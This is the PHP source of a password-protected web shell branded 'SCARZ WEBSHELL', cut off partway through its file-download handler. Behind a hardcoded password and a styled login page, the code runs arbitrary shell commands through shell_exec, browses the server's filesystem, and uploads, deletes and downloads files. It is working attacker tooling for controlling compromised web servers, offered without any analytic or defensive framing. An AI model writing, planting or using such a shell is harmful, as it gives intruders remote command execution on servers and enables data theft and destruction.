<?php
session_start();
$password = "Astriaismycrush"; 

if (isset($_POST['pass'])) {
    if ($_POST['pass'] === $password) {
        $_SESSION['auth'] = true;
    } else {
        $error = "WRONG PASSWORD!";
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['auth'])) {
    ?>
    <style>
        @keyframes rainbow {
            0% { color: #ff0000; }
            14% { color: #ff7f00; }
            28% { color: #ffff00; }
            42% { color: #00ff00; }
            57% { color: #0000ff; }
            71% { color: #4b0082; }
            85% { color: #9400d3; }
            100% { color: #ff0000; }
        }
        body {
            background: radial-gradient(circle at center, #000000 0%, #111111 100%);
            color: white;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        form {
            background: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border: 2px solid;
            border-image: linear-gradient(45deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3) 1;
            border-radius: 10px;
            text-align: center;
            width: 300px;
            box-shadow: 0 0 20px rgba(255,255,255,0.1);
        }
        input[type="password"] {
            width: 90%;
            padding: 10px;
            font-weight: bold;
            text-transform: uppercase;
            font-size: 16px;
            margin-bottom: 20px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid;
            border-image: linear-gradient(45deg, #ff0000, #ff7f00, #ffff00) 1;
            color: white;
        }
        input[type="submit"] {
            background: linear-gradient(45deg, #ff0000, #ff7f00, #ffff00);
            color: black;
            font-weight: bold;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 16px;
            text-transform: uppercase;
        }
        .error {
            color: #ff5555;
            font-weight: bold;
            margin-bottom: 15px;
            text-transform: uppercase;
        }
        .logo {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
            animation: rainbow 5s linear infinite;
            text-shadow: 0 0 10px currentColor;
        }
    </style>
    <form method="POST">
        <div class="logo">SCARZ WEBSHELL</div>
        <?php if(isset($error)) echo "<div class='error'>$error</div>"; ?>
        <input type="password" name="pass" placeholder="PASSWORD" autofocus autocomplete="off" required />
        <br/>
        <input type="submit" value="LOGIN" />
    </form>
    <?php
    exit;
}

$scriptPath = dirname(realpath(__FILE__));

if (isset($_GET['path']) && !empty($_GET['path'])) {
    $requestedPath = $_GET['path'];
    if ($requestedPath[0] !== '/') {
        $currentPath = isset($_SESSION['current_path']) ? $_SESSION['current_path'] : $scriptPath;
        $requestedPath = realpath($currentPath.'/'.$requestedPath);
    } else {
        $requestedPath = realpath($requestedPath);
    }
    
    if ($requestedPath && is_dir($requestedPath) && is_readable($requestedPath)) {
        $_SESSION['current_path'] = $requestedPath;
        $path = $requestedPath;
    } else {
        $path = isset($_SESSION['current_path']) ? $_SESSION['current_path'] : $scriptPath;
        $msg = "INVALID PATH OR ACCESS DENIED: ".htmlspecialchars($_GET['path']);
    }
} else {
    $path = isset($_SESSION['current_path']) ? $_SESSION['current_path'] : $scriptPath;
}

function exec_cmd($cmd) {
    if (stripos(PHP_OS, 'win') === 0) {
        return shell_exec($cmd . " 2>&1");
    } else {
        return shell_exec($cmd . " 2>&1");
    }
}

if (isset($_FILES['upload'])) {
    $uploadfile = $path . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $uploadfile)) {
        $msg = "UPLOAD SUCCESSFUL";
    } else {
        $msg = "UPLOAD FAILED";
    }
}

if (isset($_GET['delete'])) {
    $fileToDelete = realpath($_GET['delete']);
    if ($fileToDelete && strpos($fileToDelete, $path) === 0 && is_file($fileToDelete)) {
        unlink($fileToDelete);
        header("Location: ".$_SERVER['PHP_SELF']."?path=".urlencode($path));
        exit;
    }
}

if (isset($_GET['download'])) {
    $fileToDownload = realpath($_GET['download']);
    if ($fileToDownload && strpos($fileToDownload, $path) === 0 && is_file($fileToDownload)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($fileToDownload).'"');
        header('Content-Length: ' . filesize($fileToDownload));
        readfile
